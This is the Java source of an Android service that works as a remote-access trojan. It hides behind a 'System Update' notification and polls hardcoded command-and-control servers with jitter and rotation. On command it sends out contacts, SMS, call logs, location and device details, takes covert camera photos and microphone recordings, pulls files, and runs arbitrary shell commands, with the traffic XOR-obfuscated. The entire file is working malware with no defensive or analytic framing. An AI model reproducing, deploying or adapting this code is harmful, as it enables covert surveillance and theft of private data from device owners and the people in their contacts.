package com.androdls;

import android.app.*;
import android.content.*;
import android.database.Cursor;
import android.hardware.Camera;
import android.location.*;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.*;
import android.provider.*;
import android.util.Base64;
import android.view.SurfaceView;
import android.view.SurfaceHolder;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.util.*;

public class Agent extends Service {

    // ── C2 Config ──────────────────────────────────────────────
    private static final String[] C2_FALLBACKS = {
        "http://geeksshport4-59956.portmap.host:59956",
        "http://100.68.158.25:8080",
        "http://10.169.55.196:8080",
    };
    private static final long POLL_MS = 60000;
    private static final long JITTER_MS = 15000; // ±15s random jitter
    private static final String UA = "Mozilla/5.0 (Linux; Android 15; Build) AppleWebKit/537.36";

    // ── XOR Obfuscation Key ────────────────────────────────────
    private static final byte[] XOR_KEY = "DLS-2026".getBytes(StandardCharsets.UTF_8);

    private volatile boolean running = true;
    private String deviceId;
    private String activeC2;
    private Random rng = new Random();

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                "dls_sync", "System Update",
                NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE))
                .createNotificationChannel(ch);
        }
        startForeground(1, new Notification.Builder(this, "dls_sync")
            .setContentTitle("System Update")
            .setContentText("Syncing system components…")
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setOngoing(true)
            .setPriority(Notification.PRIORITY_MIN)
            .build());

        deviceId = Settings.Secure.getString(getContentResolver(),
            Settings.Secure.ANDROID_ID);
        activeC2 = C2_FALLBACKS[0];
        new Thread(this::loop).start();
        return START_STICKY;
    }

    // ── Main Loop with Retry Backoff ───────────────────────────
    private void loop() {
        // Register on all C2s until one works
        for (String c2 : C2_FALLBACKS) {
            try {
                activeC2 = c2;
                httpPost("/register", getDeviceInfo());
                break;
            } catch (Exception e) { /* try next */ }
        }

        int failCount = 0;
        while (running) {
            try {
                String cmd = httpGet("/cmd");
                if (cmd != null && !cmd.isEmpty() && !cmd.equals("NONE")) {
                    String result = dispatch(cmd.trim());
                    httpPost("/result", result);
                }
                failCount = 0; // reset on success
            } catch (Exception e) {
                failCount++;
                // Rotate C2 after 3 consecutive failures
                if (failCount >= 3) {
                    int idx = rng.nextInt(C2_FALLBACKS.length);
                    activeC2 = C2_FALLBACKS[idx];
                    failCount = 0;
                }
            }
            try {
                long sleepMs = POLL_MS + rng.nextLong() % (JITTER_MS * 2) - JITTER_MS;
                Thread.sleep(Math.max(10000, sleepMs));
            } catch (InterruptedException e) { break; }
        }
    }

    // ── Command Dispatcher ─────────────────────────────────────
    private String dispatch(String cmd) {
        String l = cmd.toLowerCase();
        try {
            if (l.equals("dump:contacts"))     return dumpContacts();
            if (l.equals("dump:sms"))           return dumpSms();
            if (l.equals("dump:location"))      return getLocation();
            if (l.equals("dump:device"))        return getDeviceInfo();
            if (l.equals("dump:calllog"))       return dumpCallLog();
            if (l.equals("cam:front"))          return captureCamera(true);
            if (l.equals("cam:back"))           return captureCamera(false);
            if (l.startsWith("mic:"))           return recordAudio(cmd.substring(4).trim());
            if (l.startsWith("get:"))           return pullFile(cmd.substring(4).trim());
            if (l.startsWith("sh:"))            return shell(cmd.substring(3).trim());
            return shell(cmd);
        } catch (Exception e) {
            return "ERR:" + e.getMessage();
        }
    }

    // ── Data Dumps ────────────────────────────────────────────
    private String dumpContacts() {
        StringBuilder sb = new StringBuilder("CONTACTS:\n");
        Cursor c = getContentResolver().query(
            ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        if (c == null) return "NO_CONTACTS";
        while (c.moveToNext()) {
            String name = c.getString(c.getColumnIndexOrThrow(
                ContactsContract.Contacts.DISPLAY_NAME));
            String id = c.getString(c.getColumnIndexOrThrow(
                ContactsContract.Contacts._ID));
            Cursor ph = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?",
                new String[]{id}, null);
            if (ph != null) {
                while (ph.moveToNext()) {
                    String num = ph.getString(ph.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.NUMBER));
                    sb.append(name).append(": ").append(num).append("\n");
                }
                ph.close();
            }
        }
        c.close();
        return sb.toString();
    }

    private String dumpSms() {
        StringBuilder sb = new StringBuilder("SMS:\n");
        Cursor c = getContentResolver().query(
            Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 50");
        if (c == null) return "NO_SMS";
        while (c.moveToNext()) {
            String addr = c.getString(c.getColumnIndexOrThrow("address"));
            String body = c.getString(c.getColumnIndexOrThrow("body"));
            sb.append(addr).append(": ").append(body).append("\n");
        }
        c.close();
        return sb.toString();
    }

    private String dumpCallLog() {
        StringBuilder sb = new StringBuilder("CALL_LOG:\n");
        Cursor c = getContentResolver().query(
            CallLog.Calls.CONTENT_URI, null, null, null,
            CallLog.Calls.DATE + " DESC LIMIT 50");
        if (c == null) return "NO_CALL_LOG";
        while (c.moveToNext()) {
            String num = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
            String type = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.TYPE));
            String dur = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DURATION));
            sb.append(type).append(": ").append(num).append(" (").append(dur).append("s)\n");
        }
        c.close();
        return sb.toString();
    }

    private String getLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) return "NO_LOCATION";
            return String.format(Locale.US, "%.6f,%.6f (acc=%.0fm)",
                loc.getLatitude(), loc.getLongitude(), loc.getAccuracy());
        } catch (SecurityException e) { return "PERM_DENIED"; }
    }

    private String getDeviceInfo() {
        StringBuilder sb = new StringBuilder();
        sb.append("ID=").append(deviceId).append("\n");
        sb.append("MODEL=").append(Build.MODEL).append("\n");
        sb.append("MANUFACTURER=").append(Build.MANUFACTURER).append("\n");
        sb.append("SDK=").append(Build.VERSION.SDK_INT).append("\n");
        sb.append("RELEASE=").append(Build.VERSION.RELEASE).append("\n");
        try {
            Enumeration<NetworkInterface> nis = NetworkInterface.getNetworkInterfaces();
            while (nis.hasMoreElements()) {
                NetworkInterface ni = nis.nextElement();
                Enumeration<InetAddress> addrs = ni.getInetAddresses();
                while (addrs.hasMoreElements()) {
                    InetAddress addr = addrs.nextElement();
                    if (!addr.isLoopbackAddress() && addr instanceof java.net.Inet4Address) {
                        sb.append("IP=").append(addr.getHostAddress()).append("\n");
                    }
                }
            }
        } catch (Exception ignored) {}
        return sb.toString();
    }

    // ── Camera Capture ─────────────────────────────────────────
    private String captureCamera(boolean front) {
        try {
            int camId = front ? findCameraId(Camera.CameraInfo.CAMERA_FACING_FRONT)
                              : findCameraId(Camera.CameraInfo.CAMERA_FACING_BACK);
            if (camId < 0) return "NO_CAMERA";

            Camera cam = Camera.open(camId);
            Camera.Parameters params = cam.getParameters();
            params.setPictureSize(640, 480);
            cam.setParameters(params);

            // Dummy surface for preview (required for capture)
            SurfaceView sv = new SurfaceView(this);
            SurfaceHolder holder = sv.getHolder();
            cam.setPreviewDisplay(holder);
            cam.startPreview();

            final byte[][] captured = {null};
            cam.takePicture(null, null, (data, camera) -> {
                captured[0] = data;
                synchronized (captured) { captured.notify(); }
            });

            synchronized (captured) { captured.wait(5000); }
            cam.stopPreview();
            cam.release();

            if (captured[0] == null) return "CAPTURE_TIMEOUT";
            return "PHOTO:" + Base64.encodeToString(captured[0], Base64.NO_WRAP);
        } catch (Exception e) {
            return "CAM_ERR:" + e.getMessage();
        }
    }

    private int findCameraId(int facing) {
        for (int i = 0; i < Camera.getNumberOfCameras(); i++) {
            Camera.CameraInfo info = new Camera.CameraInfo();
            Camera.getCameraInfo(i, info);
            if (info.facing == facing) return i;
        }
        return -1;
    }

    // ── Audio Recording ────────────────────────────────────────
    private String recordAudio(String durationStr) {
        int seconds = 5;
        try { seconds = Integer.parseInt(durationStr); } catch (NumberFormatException e) {}
        if (seconds > 60) seconds = 60;

        File outFile = new File(getExternalCacheDir(), "dls_record.3gp");
        MediaRecorder recorder = new MediaRecorder();
        try {
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(outFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();
            Thread.sleep(seconds * 1000L);
            recorder.stop();
            recorder.release();

            byte[] data = new byte[(int) outFile.length()];
            FileInputStream fis = new FileInputStream(outFile);
            fis.read(data);
            fis.close();
            outFile.delete();
            return "AUDIO:" + Base64.encodeToString(data, Base64.NO_WRAP);
        } catch (Exception e) {
            try { recorder.release(); } catch (Exception ignored) {}
            return "MIC_ERR:" + e.getMessage();
        }
    }

    // ── File Pull ──────────────────────────────────────────────
    private String pullFile(String path) {
        File f = new File(path);
        if (!f.exists()) return "NO_FILE";
        if (f.length() > 10485760) return "FILE_TOO_BIG";
        try {
            byte[] data = new byte[(int) f.length()];
            FileInputStream fis = new FileInputStream(f);
            fis.read(data);
            fis.close();
            return "FILE:" + path + ":" + Base64.encodeToString(data, Base64.NO_WRAP);
        } catch (Exception e) {
            return "READ_ERR:" + e.getMessage();
        }
    }

    // ── Shell ──────────────────────────────────────────────────
    private String shell(String cmd) {
        try {
            java.lang.Process p = new ProcessBuilder("/system/bin/sh", "-c", cmd)
                .redirectErrorStream(true).start();
            BufferedReader r = new BufferedReader(
                new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String l;
            while ((l = r.readLine()) != null) sb.append(l).append("\n");
            p.waitFor();
            return sb.toString();
        } catch (Exception e) { return "ERR:" + e.getMessage(); }
    }

    // ── HTTP with XOR Obfuscation ──────────────────────────────
    private String httpGet(String path) throws Exception {
        URL u = new URL(activeC2 + path);
        HttpURLConnection c = (HttpURLConnection) u.openConnection();
        c.setRequestMethod("GET");
        c.setRequestProperty("User-Agent", UA);
        c.setConnectTimeout(10000);
        c.setReadTimeout(10000);
        BufferedReader r = new BufferedReader(
            new InputStreamReader(c.getInputStream(), StandardCharsets.UTF_8));
        StringBuilder sb = new StringBuilder();
        String l;
        while ((l = r.readLine()) != null) sb.append(l).append("\n");
        c.disconnect();
        String raw = sb.toString().trim();
        // If response starts with "XOR:", deobfuscate
        if (raw.startsWith("XOR:")) {
            return xorDecode(raw.substring(4));
        }
        return raw;
    }

    private void httpPost(String path, String data) throws Exception {
        URL u = new URL(activeC2 + path);
        HttpURLConnection c = (HttpURLConnection) u.openConnection();
        c.setRequestMethod("POST");
        c.setDoOutput(true);
        c.setRequestProperty("User-Agent", UA);
        c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        OutputStream os = c.getOutputStream();
        // XOR-obfuscate the payload
        String encoded = xorEncode(data);
        os.write(("data=" + URLEncoder.encode(encoded, "UTF-8"))
            .getBytes(StandardCharsets.UTF_8));
        os.flush(); os.close();
        c.getResponseCode();
        c.disconnect();
    }

    // ── XOR Obfuscation ────────────────────────────────────────
    private String xorEncode(String input) {
        byte[] in = input.getBytes(StandardCharsets.UTF_8);
        byte[] out = new byte[in.length];
        for (int i = 0; i < in.length; i++) {
            out[i] = (byte) (in[i] ^ XOR_KEY[i % XOR_KEY.length]);
        }
        return "XOR:" + Base64.encodeToString(out, Base64.NO_WRAP);
    }

    private String xorDecode(String b64) {
        byte[] in = Base64.decode(b64, Base64.NO_WRAP);
        byte[] out = new byte[in.length];
        for (int i = 0; i < in.length; i++) {
            out[i] = (byte) (in[i] ^ XOR_KEY[i % XOR_KEY.length]);
        }
        return new String(out, StandardCharsets.UTF_8);
    }

    @Override public IBinder onBind(Intent i) { return null; }
    @Override public void onDestroy() { running = false; super.onDestroy(); }
}